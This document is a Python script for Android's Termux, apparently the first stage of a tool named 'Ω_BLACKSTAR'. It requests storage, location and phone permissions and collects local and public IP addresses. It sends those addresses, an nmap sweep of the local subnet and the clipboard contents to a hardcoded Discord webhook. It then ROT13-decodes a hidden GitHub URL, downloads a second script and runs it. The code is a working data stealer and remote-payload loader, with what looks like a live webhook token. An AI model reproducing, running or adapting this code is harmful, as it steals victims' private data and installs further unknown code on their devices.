import os
import sys
import json
import time
import subprocess
import re
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

# ============================================================
# COLORS
# ============================================================
R = '\033[31m'
G = '\033[1;32m'
O = '\033[33m'
B = '\033[34m'
C = '\033[36m'
W = '\033[0m'

# ============================================================
# CONFIG – REPLACE WITH YOUR WEBHOOK
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"

# ROT13 encoded URL for Step2
ENCODED_STEP2_URL = "uggcf://tvguho.pbz/ongcyngobg/VCTnoore/oybo/znva/Fgrc2.cl"

# ============================================================
# ROT13 DECODER
# ============================================================
def rot13_decode(text):
    """Decode ROT13 encoded text."""
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            offset = ord('a')
            result.append(chr(offset + (ord(char) - offset + 13) % 26))
        elif 'A' <= char <= 'Z':
            offset = ord('A')
            result.append(chr(offset + (ord(char) - offset + 13) % 26))
        else:
            result.append(char)
    return ''.join(result)

# ============================================================
# DISCORD WEBHOOK
# ============================================================
def send_to_discord(content, file_path=None):
    """Send a message or file to Discord via webhook."""
    try:
        import requests
        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) <= 8 * 1024 * 1024:
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                r = requests.post(WEBHOOK_URL, files=files)
            return r.status_code in (200, 204)
        else:
            r = requests.post(WEBHOOK_URL, json={"content": content})
            return r.status_code in (200, 204)
    except ImportError:
        print(f"{R}[!] requests module not installed. Installing...{W}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
        return send_to_discord(content, file_path)
    except Exception as e:
        print(f"{R}[!] Webhook error: {e}{W}")
        return False

# ============================================================
# STORAGE ACCESS
# ============================================================
def check_storage_access():
    """Check if Termux has storage access, request if not."""
    storage_path = os.path.expanduser("~/storage")
    if not os.path.exists(storage_path):
        print(f"{O}[!] Storage access not detected.{W}")
        print(f"{C}[*] Requesting storage permission...{W}")
        subprocess.run(["termux-setup-storage"], shell=True)
        print(f"{C}[*] Please grant storage access when prompted.{W}")
        time.sleep(3)
        if not os.path.exists(storage_path):
            print(f"{R}[!] Storage access still not granted. Exiting.{W}")
            sys.exit(1)
    print(f"{G}[+] Storage access confirmed.{W}")
    return True

# ============================================================
# TERMUX-API SETUP
# ============================================================
def check_termux_api():
    """Check if termux-api is installed, install if missing."""
    try:
        subprocess.run(["termux-api"], capture_output=True, timeout=2)
        return True
    except:
        print(f"{O}[!] termux-api not found.{W}")
        print(f"{C}[*] Installing termux-api...{W}")
        try:
            subprocess.run(["pkg", "install", "termux-api", "-y"], check=True)
            print(f"{G}[+] termux-api installed successfully!{W}")
            return True
        except:
            print(f"{R}[!] Failed to install termux-api.{W}")
            print(f"{C}[*] Please install manually: pkg install termux-api{W}")
            print(f"{C}[*] Also install Termux:API app from F-Droid or Play Store{W}")
            return False

def request_permissions():
    """Request Termux API permissions."""
    print(f"{C}[*] Requesting Termux:API permissions...{W}")
    print(f"{O}[!] Please grant the following permissions when prompted:{W}")
    print(f"  • Storage (to read/write files)")
    print(f"  • Location (for GPS coordinates)")
    print(f"  • Phone (for device info)")
    print()

    # Try to trigger permission requests
    try:
        subprocess.run(["termux-telephony"], capture_output=True, timeout=2)
    except:
        pass
    try:
        subprocess.run(["termux-location"], capture_output=True, timeout=2)
    except:
        pass

    print(f"{G}[+] Permissions requested.{W}")
    print(f"{C}[*] If you don't see a prompt, go to:{W}")
    print(f"  Settings → Apps → Termux:API → Permissions")
    print(f"  And enable all permissions manually.")
    time.sleep(2)

# ============================================================
# IP & NETWORK FUNCTIONS
# ============================================================
def get_local_ip():
    """Get local IP address using ifconfig."""
    try:
        result = subprocess.run(["ifconfig"], capture_output=True, text=True)
        output = result.stdout
        
        # Look for wlan0 or eth0 section
        for line in output.splitlines():
            if "inet " in line and "127.0.0.1" not in line:
                parts = line.strip().split()
                for i, part in enumerate(parts):
                    if part == "inet" and i + 1 < len(parts):
                        ip = parts[i + 1]
                        # Check if it's a private IP
                        if ip.startswith(("192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.")):
                            return ip
        return None
    except Exception as e:
        print(f"{R}[!] Error getting local IP: {e}{W}")
        return None

def get_public_ip():
    """Get public IP address."""
    try:
        import requests
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip", "unknown")
    except:
        return "unknown"

def is_vpn_ip(ip):
    """Basic VPN detection based on IP range."""
    if not ip:
        return True
    # Some common VPN/cloud ranges
    vpn_ranges = [
        "192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.",
        "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
        "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
        "100.64.", "127.", "0."
    ]
    for prefix in vpn_ranges:
        if ip.startswith(prefix):
            return True
    return False

def run_nmap_scan(ip):
    """Run nmap scan on the local network and save results."""
    if not ip:
        return None
    
    # Determine subnet
    subnet = ".".join(ip.split(".")[:3]) + ".0/24"
    output_file = "nmap_scan.txt"
    
    print(f"{C}[*] Scanning subnet: {subnet}{W}")
    try:
        result = subprocess.run(
            ["nmap", "-sn", subnet],
            capture_output=True, text=True, timeout=60
        )
        with open(output_file, "w") as f:
            f.write(f"=== Nmap Scan Results ===\n")
            f.write(f"Target: {subnet}\n")
            f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write(result.stdout)
            if result.stderr:
                f.write("\n=== Errors ===\n")
                f.write(result.stderr)
        
        print(f"{G}[+] Nmap scan saved to: {output_file}{W}")
        return output_file
    except subprocess.TimeoutExpired:
        print(f"{R}[!] Nmap scan timed out.{W}")
        return None
    except Exception as e:
        print(f"{R}[!] Nmap scan error: {e}{W}")
        return None

# ============================================================
# CLIPBOARD FUNCTIONS
# ============================================================
def get_clipboard():
    """Get clipboard content using termux-clipboard-get."""
    try:
        result = subprocess.run(
            ["termux-clipboard-get"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
        return None
    except:
        return None

# ============================================================
# MAIN EXECUTION
# ============================================================
def main():
    print(f"\n{C}{'='*60}{W}")
    print(f"{C}Ω_BLACKSTAR – Step1.py Init{W}")
    print(f"{C}{'='*60}{W}\n")

    # Step 1: Check storage access
    print(f"{C}[*] Checking storage access...{W}")
    check_storage_access()

    # Step 2: Check termux-api
    print(f"{C}[*] Checking termux-api...{W}")
    if not check_termux_api():
        print(f"{O}[!] termux-api not fully configured.{W}")
        request_permissions()

    # Step 3: Get IP address
    print(f"{C}[*] Getting IP addresses...{W}")
    local_ip = get_local_ip()
    public_ip = get_public_ip()

    ip_info = f"Local IP: {local_ip or 'Not found'}\nPublic IP: {public_ip}"
    print(f"{G}[+] {ip_info}{W}")

    # Step 4: Send IP info to Discord
    send_to_discord(f"📡 **Step1.py Init**\n```\n{ip_info}\n```")

    # Step 5: Run nmap if real IP
    if local_ip and not is_vpn_ip(local_ip):
        print(f"{C}[*] Real IP detected. Running nmap scan...{W}")
        nmap_file = run_nmap_scan(local_ip)
        if nmap_file:
            send_to_discord("📡 **Nmap Scan Results**", nmap_file)
    else:
        print(f"{O}[!] VPN or no IP detected. Skipping nmap scan.{W}")

    # Step 6: Get clipboard
    print(f"{C}[*] Getting clipboard content...{W}")
    clipboard = get_clipboard()
    if clipboard:
        print(f"{G}[+] Clipboard: {clipboard[:100]}...{W}")
        send_to_discord(f"📋 **Clipboard Content**\n```\n{clipboard[:1900]}\n```")
    else:
        print(f"{O}[!] No clipboard content found.{W}")

    # Step 7: Decode and fetch Step2.py
    print(f"{C}[*] Decoding Step2 URL...{W}")
    step2_url = rot13_decode(ENCODED_STEP2_URL)
    print(f"{G}[+] Decoded: {step2_url}{W}")

    # Convert to raw URL and fetch
    raw_url = step2_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
    print(f"{C}[*] Fetching Step2.py from: {raw_url}{W}")

    try:
        import requests
        response = requests.get(raw_url, timeout=15)
        if response.status_code == 200 and response.text.strip():
            with open("Step2.py", "w") as f:
                f.write(response.text)
            print(f"{G}[+] Step2.py downloaded successfully!{W}")
            send_to_discord("✅ **Step2.py fetched successfully**")
            print(f"{C}[*] Executing Step2.py...{W}")
            os.system("python3 Step2.py")
        else:
            print(f"{O}[!] Step2.py not found (HTTP {response.status_code}){W}")
            send_to_discord(f"⚠️ **Step2.py not found** (HTTP {response.status_code})")
    except Exception as e:
        print(f"{R}[!] Error fetching Step2.py: {e}{W}")
        send_to_discord(f"❌ **Error fetching Step2.py**: {e}")

    print(f"\n{G}[+] Step1.py completed.{W}")
    print(f"{C}{'='*60}{W}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Interrupted.{W}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{R}[!] Fatal error: {e}{W}")
        sys.exit(1)
